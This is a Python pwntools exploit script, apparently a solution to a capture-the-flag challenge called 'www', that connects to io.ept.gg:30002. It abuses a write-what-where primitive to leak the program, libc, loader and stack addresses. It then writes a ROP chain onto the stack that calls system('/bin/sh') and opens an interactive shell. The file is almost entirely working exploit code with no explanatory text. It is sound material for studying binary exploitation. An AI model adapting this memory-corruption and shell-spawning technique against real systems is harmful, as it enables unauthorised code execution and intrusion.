#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./www')

host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *main+91
continue
'''.format(**locals())

libc = ELF('libc-2.33.so')
ld = ELF('ld-2.33.so')
io = start()
pause()
def WWW(where, value, end=False):

   
    io.recvuntil('>')
    io.sendline(hex(where))
    io.recvuntil('>')
    io.sendline(hex(value))
    if not end:
        io.recvuntil('[')
        leak = int(io.recvuntil(']')[:-1],16)
        return leak
    else:
        return 0


#free base leak
io.recvuntil('[')
leak = int(io.recvuntil(']')[:-1],16)
exe.address = leak - exe.sym.banner
log.success(f'base @ {hex(exe.address)}')

#leak libc
printf = WWW(exe.sym.addr2, exe.got.printf)
libc.address = printf - libc.sym.printf
log.success(f'libc base @ {hex(libc.address)}')

#leak ld
ld_leak = WWW(exe.sym.addr2, exe.address+0x3e50)
ld.address = ld_leak - 0x35100
log.success(f'ld base @ {hex(ld.address)}')

#leak stack
stack = WWW(exe.sym.addr2, ld.sym.__libc_stack_end)
rsp = stack-0x130
log.success(f'rsp @ {hex(rsp)}')
libc_ret_on_stack = rsp+0x48


#create and write ropchain and write it to stack
rop = ROP(libc)
rop.call(0x14d7 + exe.address) 
rop.system(next(libc.search(b'/bin/sh\x00')))
line = rop.chain()
n = 8 
rops = [line[i:i+n] for i in range(0, len(line), n)]
for i,r in enumerate(rops):
    WWW(libc_ret_on_stack + (i*8), u64(r))

#lets set 'done' to one to get out of the loop.
stack = WWW(rsp+7, 0x0101010101010101, True)
io.interactive()

